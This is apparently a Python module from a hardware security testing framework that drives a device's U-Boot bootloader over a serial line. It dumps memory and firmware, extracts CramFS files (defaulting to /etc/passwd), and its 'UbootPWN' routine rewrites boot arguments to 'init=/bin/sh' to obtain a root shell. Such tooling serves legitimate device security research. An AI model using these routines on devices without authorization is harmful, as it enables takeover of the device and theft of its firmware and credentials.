from core.ISFFramework import ISFContainer, submodule, Param
import time,string,re,os,serial
from modules.hardware.uboot.cli_prefix import PREFIX_ARRAY

@ISFContainer(version="1.0",
           author="Not_so_sm4rt_hom3 team")
class UBootWorker:
    in_params = {
        "Device": Param("Path to device. Example: COM14", required=False, default_value='/dev/tty.usbserial-00000000'),
        "Baudrate": Param("Digital baudrate for serial connection", value_type=int, required=False, default_value=115200),
        "Timeout": Param("Timeout between requests",required=False, default_value=0.1, value_type=float),
        "Debug": Param("Use verbose output", required=False, value_type=bool, default_value=False)
    }

    out_params = {
        "status": Param("Status of result", value_type=int)
    }


    baudrate = 115200
    device_path = ''
    connected = 0
    timeout = 0.1
    ser = ''
    debug = False
    readyConsole = False

    def __init__(self, in_params):
        import serial
        self.device_path = in_params['Device']
        self.baudrate = in_params['Baudrate']
        self.timeout = in_params['Timeout']
        self.debug = in_params['Debug']

    def __del__(self):
        if self.connected:
            self.ser.close()

    def first_connect(self):
        self.ser = serial.Serial(port=self.device_path, baudrate=self.baudrate, timeout=self.timeout, exclusive=1)
        self.connected = 1

    @submodule(name="UbootSendCMD",
               description="Send and receive U-Boot messages",
               in_params={
                   "message": Param("Message to send not on", value_type=str, required=True),
                   "notempty": Param("Not empty answer", value_type=bool, required=False, default_value=True)
               },
               out_params={"result": Param("Result answer", value_type=str)})
    def sendCMD(self, params):
        if self.connected==0:
            self.first_connect()
        ans = ''
        cmd = params['message']
        if self.debug:
            print([cmd])
        if self.connected:
            #TODO: problems with repeated output
            #for x in range(10):
            #    self.ser.write(b'\r\n'*1)
            #for x in range(3):
            #    self.ser.read(100)
            self.ser.write(cmd.encode('ascii')+b'\r\n')
            time.sleep(self.timeout)
            ans = self.ser.read(10000)
            if self.debug:
                try:
                    print('Serial response:',"".join(map(chr, ans)))
                except:
                    pass
                    #TODO:fix
            #problem with another prefix
            tmp = b'123'
            #OLD
            #while (not (("".join(map(chr, ans)).endswith('U-Boot> ')) or ("".join(map(chr, ans)).endswith('HKVS # '))) and (params['notempty']==True)) and tmp != b'':
            while ((not(sum(["".join(map(chr, ans)).endswith(x) for x in PREFIX_ARRAY]))) and (params['notempty']==True)) and tmp != b'':
                if self.debug:
                    print('Ends with:',ans)
                print('Retrying to read')
                time.sleep(self.timeout)
                tmp = self.ser.read(10000)
                ans += tmp

        return {'result': "".join(map(chr, ans))}

    @submodule(name="UbootOnOff",
                   description="Turn on U-Boot console",
                   in_params={

                   },
                   out_params={"Success": Param("Result status", value_type=bool)})
    def consoleInitializer(self, params):
        print('Turn off your device & wait for 5 seconds.')
        time.sleep(5)
        params['message'] = '\x03'
        params['notempty'] = False
        self.sendCMD(params)
        print('Turn on device & wait for 10 seconds.')
        counter = 0
        answer = ''
        while counter < 20:
            self.sendCMD(params)
            counter+=1
        self.readyConsole = 1
        params['Need2Open'] = False
        params['notempty'] = True
        version = self.getVersion(params)['version']
        if not version!='':
            print('Can\'t create connection to Serial CLI!')
        return {'Success':version != ''}


    @submodule(name="UARTenvReader",
               description="Get list & values of U-Boot environment",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True)
               },
               out_params={"ValueList": Param("Dictionary of values", value_type=dict)})
    def getEnvs(self,params):

        if params['Need2Open'] and self.readyConsole==0:
            self.consoleInitializer(params)
            params['Need2Open'] = False
        params['message'] = 'printenv'
        params['notempty'] = True
        result = self.sendCMD(params)['result']
        if self.debug:
            print(result)
        ans = ''
        for x in PREFIX_ARRAY:
            try:
                ans = result.split(x)[0].split('printenv\r\n')[1]
            except:
                pass
        if ans == '':
            return {'status':-1}

        arr = ans.split('\r\n')
        vec = {}
        if self.debug:
            print(arr)
        for x in arr:
            vec[x.split('=')[0]] = '='.join(x.split('=')[1:])
        if '' in vec:
            del vec['']

        return {'ValueList':vec}

    @submodule(name="UbootVersion",
               description="Get version of U-Boot loader",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True)
               },
               out_params={"version": Param("U-Boot version", value_type=str)})
    def getVersion(self, params):
        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False
        ans = ''
        if self.readyConsole:
            params['message'] = 'version'
            params['notempty'] = True
            result = self.sendCMD(params)['result']
            if self.debug:
                print('Result:',result)
            ans = ''
            for x in PREFIX_ARRAY:
                try:
                   ans = result.split(x)[0].split('version\r\n\r\n')[1]
                except:
                    pass
            if ans == '':
                return {'status':-1}
        return {'version':ans}

    @submodule(name="getUbootCMDs",
               description="Get list of U-Boot commands",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True)
               },
               out_params={"commands": Param("Dictionary of commands", value_type=dict)})
    def getCMDlist(self,params):
        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False
        ans = {}
        if self.readyConsole:
            params['message'] = 'help'
            params['notempty'] = True
            result = self.sendCMD(params)['result']
            if self.debug:
                print('Result:',result)
            ans_str = ''
            for x in PREFIX_ARRAY:
                try:
                    ans_str = result.split(x)[0].split('help\r\n')[1]
                except:
                    pass
            if ans_str=='':
                return {'status':-1}
            m = ans_str.split('\r\n')
            for x in m:
                ans[x.split('-')[0].replace(' ','')] = '-'.join([ y.strip().replace('  ',' ') for y in x.split('-')[1:]])
        return {'commands':ans}


    @submodule(name="PrepareToBoot",
               description="Prepare flash memory for booting firmware (or dumping it)",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True)
               },
               out_params={"status": Param("Status result",value_type=bool) })
    def prepare2boot(self,params):
        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False

        varibles = self.getEnvs(params)['ValueList']
        if self.debug:
            print(varibles)
        runcmd = ';'.join(varibles['bootcmd'].split(';')[0:-1])

        val2replace = re.findall(r'\$[\d\w]*',runcmd)
        for x in val2replace:
            if x in runcmd and x[1:] in varibles:
                runcmd = runcmd.replace(x,varibles[x[1:]])

        #запускаем все кроме последней команды (разделены ;)
        params['message'] = runcmd
        params['notempty'] = True
        result = self.sendCMD(params)['result']

        if self.debug:
            print(result)

        print('Wait for loading firmware! (10 sec)')
        time.sleep(10)

        return {'status':True}

    @submodule(name="memoryDumper",
               description="Dump device memory",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True),
                   "DumpType": Param("tftp, microsd, serial. Default: serial", value_type=str, required=False,
                                     default_value='serial'),
                   "Path2Save": Param("Save dump to.", value_type=str, required=True),
                   "Offset": Param("Offset of memory dump", value_type=int, required=False,
                                   default_value=0x40000),
                   "Length": Param("Length of memory dump in bytes", value_type=int, required=False,
                                   default_value=1024 * 50)
               },
               out_params={"Size": Param("Size of downloaded memory dump", value_type=int)})
    def memoryDump(self,params):
        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False

        params['message'] = '\r\n'
        result = self.sendCMD(params)['result']


        offset = params['Offset'] - (params['Offset'] % 0x100)
        memory_bytes = b''
        if params["DumpType"]=='serial':
            # считываем
            while offset - params['Offset'] < params['Length'] + (params['Offset'] % 0x100):
                print("Reading memory from {} to {}".format(hex(offset), hex(offset + 0x100)))
                runcmd = ' md.l ' + hex(offset)

                if self.debug:
                    print(runcmd)
                params['message'] = runcmd
                params['notempty'] = True
                result = self.sendCMD(params)['result']
                if self.debug:
                    print('====DEBUG====')
                    print(result)

                result_arr = [x for x in result.split('\r\n') if not sum([x.endswith(y) for y in PREFIX_ARRAY]) and not x.startswith('md.l') and x != '' and x != runcmd]
                if self.debug:
                    print('====DEBUG====')
                    print(result_arr)
                r_get_values = "([0-9a-fA-F]{8}): ([0-9a-fA-F]{8}) ([0-9a-fA-F]{8}) ([0-9a-fA-F]{8}) ([0-9a-fA-F]{8})    (.{16})"
                for x in result_arr:
                    if bool(re.match(r_get_values, x)):
                        res = re.match(r_get_values, x)
                        memory_bytes += b''.join([bytes.fromhex(x)[::-1] for x in res.groups()[1:5]])

                        if self.debug:
                            print(x)
                            print(res.groups())
                            print('Memory bytes:',memory_bytes)
                    else:
                        print('Found exception at device while dumping memory.')
                        break
                offset += 0x100
                if self.debug:
                    print('{} ??? {}'.format(offset - params['Offset'], params['Length'] + (params['Offset'] % 0x100)))

            memory_bytes = memory_bytes[ params['Offset'] % 0x100 : params['Length']]

            print('Saving downloaded memory of size {} bytes to {}'.format(len(memory_bytes), params['Path2Save']))

            f = open(params['Path2Save'], 'wb')
            f.write(memory_bytes)
            f.close()
        return {'Size': len(memory_bytes)}



    @submodule(name="UbootDumper",
               description="Dump firmware with U-Boot CLI output",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True),
                   "DumpType": Param("tftp, microsd, serial. Default: serial", value_type=str, required=False, default_value='serial'),
                   "Path": Param("Save dump to.", value_type=str, required=True),
                   "Offset": Param("Offset of firmware data in memory", value_type=int, required=False, default_value=0x40000),
                   "Length": Param("Length of firmware in bytes", value_type=int, required=False, default_value=1024*50)
               },
               out_params={"Size": Param("Size of downloaded firmware", value_type=int)})
    def dumpFirmMD(self,params):
        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False

        self.prepare2boot(params)

        result = self.memoryDump(params)

        return result

    @submodule(name="UbootPWN",
               description="Get bash shell console",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True),
                   "OpenTTYConsole": Param("Open TTY to use PWN'ed console after exploitation", value_type=bool, required=False, default_value=True)
               },
               out_params={"version": Param("U-Boot version", value_type=str)})
    def getShell(self,params):
        if params['Need2Open'] and self.readyConsole==0:
            self.consoleInitializer(params)
            params['Need2Open'] = False
        params['message'] = 'printenv'
        params['notempty'] = True
        envs_old = self.sendCMD(params)['result']

        cmds=[
            'setenv extra_boot_args init=/bin/sh',
            'setenv optargs init=/bin/sh',
            'setenv bootargs ${bootargs} single init=/bin/sh'
        ]

        for x in cmds:
            print('Sending command:',x)
            params['message'] = x
            params['notempty'] = True
            result = self.sendCMD(params)['result']
            if self.debug:
                print('Result:',result)
        params['message'] = 'printenv'
        params['notempty'] = True
        envs_new = self.sendCMD(params)['result']
        if self.debug:
            print(envs_new)

        print('Sending command: boot')
        params['message'] = 'boot'
        params['notempty'] = True
        result = self.sendCMD(params)['result']

    @submodule(name="UbootTalk",
               description="Send and receive UART messages",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True)
               },
               out_params={"status": Param("Result status", value_type=bool)})

    def UbootTalk(self,params):
        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False

        cmd = ''
        while 1:
            cmd = input('Command: ')
            if cmd != 'pwnexit':
                params['message'] = cmd
                params['notempty'] = True
                result = self.sendCMD(params)['result']
                print(result)
            else:
                break
        print('Goodbye!')
        return {"status": True}




    @submodule(name="CramFSls",
               description="Get list of files in CramFS (cramfsls command need)",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True),
                   "Path": Param("Path to get list of files and dirs", value_type=str, required=False, default_value='/'),
                   "NotFoundPathString": Param("String (or substring), which returns, when path was not found", value_type=str, required=False, default_value='corresponding entry'),
                   "Need2PrepareMemory": Param("Need to prepare memory for booting/dumping firmware", value_type=bool, required=False, default_value=True)
               },
               out_params={"filelist": Param("List of files", value_type=list)})
    def cramFSls(self, params):
        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False

        commands = self.getCMDlist(params)['commands']

        if not 'cramfsls' in commands:
            print('Command "cramfsls" not found! Closing...')
            return {'status':-1}

        if params['Need2PrepareMemory']:
            self.prepare2boot(params)

        cmd = 'cramfsls '+params['Path']
        params['message'] = cmd
        params['notempty'] = True
        result = self.sendCMD(params)['result']

        if self.debug:
            print(result)
        if params['NotFoundPathString'] in result:
            print('Path was not found!')
            return {'status':-1}

        m = [x.split(' -> ')[0] for x in result.split('\r\n') if not x.startswith('U-Boot')]

        r = ' ([^ ]+)[ ]+([\d]*) (.+)'

        l = []

        for x in m:
            if bool(re.match(r,x)):
                obj = {}
                res = re.match(r, x)
                arr = res.groups()
                if self.debug:
                    print(arr)
                obj['size'] = int(arr[1])
                if arr[0].startswith('d'):
                    obj['type'] = 'dir'
                elif arr[0].startswith('-'):
                    obj['type'] = 'file'
                elif arr[0].startswith('l'):
                    obj['type'] = 'symlink'
                else:
                    obj['type'] = 'other,'+arr[0][0]
                obj['name'] = arr[2]
                l.append(obj)

        return {'filelist':l}

    @submodule(name="CramFSload",
               description="Download file from CramFS (cramfsload command need)",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI", value_type=bool, required=False, default_value=True),
                   "Path2Load": Param("Path to file.", value_type=str, required=False,
                                 default_value='/etc/passwd'),
                   "Path2Save": Param("Save file to..", value_type=str, required=False,
                                 default_value='/tmp/1.bin'),
                   "NotFoundPathString": Param("String (or substring), which returns, when path was not found",
                                               value_type=str, required=False, default_value='corresponding entry'),
                   "MemoryFileLoadSuccess": Param("String (or substring), which returns, when file was loaded to memory!",
                                                value_type=str, required=False, default_value='CRAMFS load complete:'),
                   "Need2PrepareMemory": Param("Need to prepare memory for booting/dumping firmware", value_type=bool,
                                               required=False, default_value=True),
                   "DumpType": Param("tftp, microsd, serial. Default: serial", value_type=str, required=False, default_value='serial')
               },
               out_params={"Size": Param("Size of downloaded file", value_type=int)})
    def cramFSload(self,params):
        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False

        print('CramFSload: ',params['Path2Load'])

        commands = self.getCMDlist(params)['commands']

        if not 'cramfsload' in commands:
            print('Command "cramfsls" not found! Closing...')
            return {'status':-1}

        if params['Need2PrepareMemory']:
            self.prepare2boot(params)

        cmd = 'cramfsload ' + params['Path2Load']

        self.timeout = 2
        params['message'] = cmd
        params['notempty'] = True
        result = self.sendCMD(params)['result']
        self.timeout = params['Timeout']

        if self.debug:
            print(result)
        if params['NotFoundPathString'] in result:
            print('Path was not found!')
            return {'status': -1}

        if not params['MemoryFileLoadSuccess'] in result:
            print('Memory load error!')
            return {'status': - 1}

        s = result.split(': ')[1].split('\r\n')[0].strip().split(' ')
        if self.debug:
            print(s)
        size = int(s[0])
        address = int(s[-1],16)

        params['Offset'] = address
        params['Length'] = size

        result = self.memoryDump(params)

        if self.debug:
            print(result)

        print('File {} was loaded with size {} bytes.'.format(params['Path2Load'], result['Size']))

        return result

    @submodule(name="CramFSdump",
               description="Recursive dumping files and folder (need cramfsls & cramfsload)",
               in_params={
                   "Need2Open": Param("Need to open U-Boot CLI",
                                      value_type=bool, required=False, default_value=True),
                   "DumpFolder": Param("Folder to dump",
                                       value_type=str, required=False, default_value='/'),
                   "DirPath": Param("Path to !NEW! folder to save dump of cramfs.",
                                    value_type=str, required=False, default_value='/tmp/firmware'
                                    ),
                   "NotFoundPathString": Param("String (or substring), which returns, when path was not found",
                                               value_type=str, required=False, default_value='corresponding entry'),
                   "Need2PrepareMemory": Param("Need to prepare memory for booting/dumping firmware", value_type=bool,
                                               required=False, default_value=True),
                   "DumpType": Param("tftp, microsd, serial. Default: serial", value_type=str, required=False,
                                     default_value='serial'),
                   "MemoryFileLoadSuccess": Param(
                       "String (or substring), which returns, when file was loaded to memory!",
                       value_type=str, required=False, default_value='CRAMFS load complete:'),

               },
               out_params={"filelist": Param("list of saved files", value_type=list)})

    def dumpCramFS(self, params):

        if params['Need2Open']:
            self.consoleInitializer(params)
            params['Need2Open'] = False


        #create folder where to dump
        os.makedirs(os.path.dirname(params['DirPath']), exist_ok=True)

        filelist = self.dumpFilesFromFolder(params, params['DumpFolder'], params['DirPath'], params['DumpFolder'] )

        return {"filelist":filelist}


    def dumpFilesFromFolder(self,params, folder, syspath, root_dir):

        if self.debug:
            print('Args: {} {} {}'.format(folder, syspath, root_dir))
        params['Path']= folder
        filelist = self.cramFSls(params)['filelist']
        params['Need2PrepareMemory'] = False
        downloaded_list = []
        if self.debug:
            print(filelist)
        for file in filelist:
            if self.debug:
                print(file)
            if file['type'] == 'dir':
                new_dir_path = folder.rstrip('/')+'/'+file['name']
                if self.debug:
                    print('Recursive folder {}'.format(new_dir_path))
                downloaded_list += self.dumpFilesFromFolder(params, new_dir_path, syspath, root_dir)
            if file['type'] == 'file':
                new_dir_path = syspath.rstrip('/')+'/'+folder.lstrip(root_dir).strip('/')
                params['Path2Load'] = folder.rstrip('/')+'/'+file['name']
                params['Path2Save'] = new_dir_path+ '/'+file['name']
                os.makedirs(os.path.dirname(new_dir_path+'/'), exist_ok=True)
                if self.debug:
                    print('Args: {} {} {}'.format(new_dir_path,params['Path2Load'],params['Path2Save']))
                downloaded_list.append(params['Path2Save'])
                self.cramFSload(params)
        return downloaded_list



